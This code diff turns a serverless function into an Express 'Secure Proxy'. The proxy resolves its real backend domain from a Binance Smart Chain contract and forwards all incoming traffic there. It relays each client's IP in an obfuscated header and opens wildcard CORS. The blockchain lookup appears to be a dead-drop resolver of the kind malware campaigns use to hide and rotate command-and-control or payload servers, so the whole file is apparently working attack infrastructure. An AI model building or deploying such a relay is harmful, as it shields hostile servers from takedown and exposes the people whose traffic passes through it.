@@ -1,132 +1,156 @@
+import express from "express";
 import fetch from "node-fetch";
+import { readFile, writeFile } from "fs/promises";
+import { tmpdir } from "os";
+import { join } from "path";
 
-// --- In-memory cache ---
-let cache = { domain: null, timestamp: 0 };
+const app = express();
+app.use(express.text({ type: "*/*" })); // To capture raw body
+
 const UPDATE_INTERVAL = 60 * 1000; // 60s
+const CACHE_FILE = join(tmpdir(), "proxy_cache.json");
+const RPC_URLS = [
+  "https://binance.llamarpc.com",
+  "https://bsc.drpc.org",
+];
+const CONTRACT_ADDRESS = "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";
 
-// --- Get client IP ---
+// --- Utility Functions ---
 function getClientIP(req) {
-  if (req.headers["cf-connecting-ip"]) return req.headers["cf-connecting-ip"];
-  if (req.headers["x-forwarded-for"])
-    return req.headers["x-forwarded-for"].split(",")[0].trim();
-  return req.socket.remoteAddress;
+  return (
+    req.headers["cf-connecting-ip"] ||
+    req.headers["x-forwarded-for"]?.split(",")[0] ||
+    req.connection.remoteAddress
+  );
 }
 
-// --- Hex to string (from contract result) ---
+async function loadCache() {
+  try {
+    const data = JSON.parse(await readFile(CACHE_FILE, "utf-8"));
+    if (Date.now() - data.timestamp < UPDATE_INTERVAL) {
+      return data.domain;
+    }
+  } catch (_) {}
+  return null;
+}
+
+async function saveCache(domain) {
+  await writeFile(
+    CACHE_FILE,
+    JSON.stringify({ domain, timestamp: Date.now() })
+  );
+}
+
 function hexToString(hex) {
   hex = hex.replace(/^0x/, "");
-  const length = parseInt(hex.slice(64, 128), 16);
-  const dataHex = hex.slice(128, 128 + length * 2);
+  hex = hex.substring(64);
+  const length = parseInt(hex.substring(0, 64), 16);
+  const dataHex = hex.substring(64, 64 + length * 2);
   let result = "";
   for (let i = 0; i < dataHex.length; i += 2) {
-    const charCode = parseInt(dataHex.substr(i, 2), 16);
-    if (charCode === 0) break;
-    result += String.fromCharCode(charCode);
+    const code = parseInt(dataHex.substring(i, i + 2), 16);
+    if (code === 0) break;
+    result += String.fromCharCode(code);
   }
   return result;
 }
 
-// --- Fetch target domain from blockchain ---
 async function fetchTargetDomain() {
-  const rpcUrls = [
-    "https://binance.llamarpc.com",
-    "https://bsc.drpc.org"
-  ];
-  const contractAddress = "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";
-  const data = "0x20965255";
+  const data = "20965255";
+  const payload = {
+    jsonrpc: "2.0",
+    id: 1,
+    method: "eth_call",
+    params: [
+      { to: CONTRACT_ADDRESS, data: "0x" + data },
+      "latest",
+    ],
+  };
 
-  for (const rpcUrl of rpcUrls) {
+  for (const url of RPC_URLS) {
     try {
-      const resp = await fetch(rpcUrl, {
+      const res = await fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          jsonrpc: "2.0",
-          id: 1,
-          method: "eth_call",
-          params: [{ to: contractAddress, data }, "latest"]
-        })
+        body: JSON.stringify(payload),
       });
-
-      const json = await resp.json();
-      if (json.result) return hexToString(json.result);
-    } catch (err) {
-      console.error("RPC fetch error:", err);
-    }
+      const json = await res.json();
+      if (!json.error) {
+        return hexToString(json.result);
+      }
+    } catch (_) {}
   }
-
   throw new Error("Could not fetch target domain");
 }
 
-// --- Get cached target domain ---
 async function getTargetDomain() {
-  const now = Date.now();
-  if (cache.domain && now - cache.timestamp < UPDATE_INTERVAL) return cache.domain;
+  const cached = await loadCache();
+  if (cached) return cached;
   const domain = await fetchTargetDomain();
-  cache = { domain, timestamp: now };
+  await saveCache(domain);
   return domain;
 }
 
-// --- Main Handler ---
-export const config = {
-  api: {
-    bodyParser: false, // So we can forward raw body
-  },
-};
-
-export default async function handler(req, res) {
-  // CORS
-  res.setHeader("Access-Control-Allow-Origin", "*");
-  res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
-  res.setHeader("Access-Control-Allow-Headers", "*");
-
-  if (req.method === "OPTIONS") {
-    return res.status(204).end();
+// --- Proxy Handler ---
+app.all("/", async (req, res) => {
+  if (req.query.e === "ping_proxy") {
+    return res.type("text").send("pong");
   }
-
-  const { e } = req.query;
-  if (!e) return res.status(400).send("Missing endpoint");
-
-  if (e === "ping_proxy") {
-    res.setHeader("Content-Type", "text/plain");
-    return res.status(200).send("pong");
+  if (!req.query.e) {
+    return res.status(400).send("Missing endpoint");
   }
 
   try {
-    const targetDomain = await getTargetDomain();
-    const endpoint = "/" + decodeURIComponent(e).replace(/^\//, "");
-    const url = `${targetDomain}${endpoint}`;
+    const targetDomain = (await getTargetDomain()).replace(/\/$/, "");
+    const endpoint = "/" + decodeURIComponent(req.query.e).replace(/^\//, "");
+    const url = targetDomain + endpoint;
 
-    // --- Read raw body ---
-    const rawBody = await new Promise((resolve) => {
-      let data = [];
-      req.on("data", (chunk) => data.push(chunk));
-      req.on("end", () => resolve(Buffer.concat(data)));
-    });
+    const clientIP = getClientIP(req);
 
-    // --- Forward headers (except restricted) ---
+    // Build headers
     const headers = { ...req.headers };
     delete headers.host;
     delete headers.origin;
     delete headers["accept-encoding"];
     delete headers["content-encoding"];
+    headers["x-dfkjldifjlifjd"] = clientIP;
 
-    headers["x-dfkjldifjlifjd"] = getClientIP(req);
-
-    const proxyResp = await fetch(url, {
+    const proxyRes = await fetch(url, {
       method: req.method,
       headers,
-      body: ["GET", "HEAD"].includes(req.method) ? undefined : rawBody
+      body: req.method !== "GET" && req.method !== "HEAD" ? req.body : undefined,
+      redirect: "follow",
     });
 
-    const contentType = proxyResp.headers.get("content-type") || "application/octet-stream";
-    const buffer = Buffer.from(await proxyResp.arrayBuffer());
+    // Forward status and content-type
+    res.status(proxyRes.status);
+    proxyRes.headers.forEach((value, key) => {
+      res.setHeader(key, value);
+    });
 
-    res.status(proxyResp.status);
-    res.setHeader("Content-Type", contentType);
-    res.send(buffer);
-  } catch (error) {
-    console.error("Proxy error:", error);
-    res.status(500).send(`error: ${error.message}`);
+    res.setHeader("Access-Control-Allow-Origin", "*");
+    res.setHeader("Access-Control-Allow-Methods", "GET, HEAD, POST, OPTIONS");
+    res.setHeader("Access-Control-Allow-Headers", "*");
+
+    const buffer = await proxyRes.arrayBuffer();
+    res.send(Buffer.from(buffer));
+  } catch (e) {
+    console.error(e);
+    res.status(500).send("error: " + e.message);
   }
-}
+});
+
+// --- CORS Preflight ---
+app.options("*", (req, res) => {
+  res.setHeader("Access-Control-Allow-Origin", "*");
+  res.setHeader("Access-Control-Allow-Methods", "GET, HEAD, POST, OPTIONS");
+  res.setHeader("Access-Control-Allow-Headers", "*");
+  res.setHeader("Access-Control-Max-Age", "86400");
+  res.status(204).send();
+});
+
+// --- Start Server ---
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log(`Secure Proxy running on port ${PORT}`);
+});
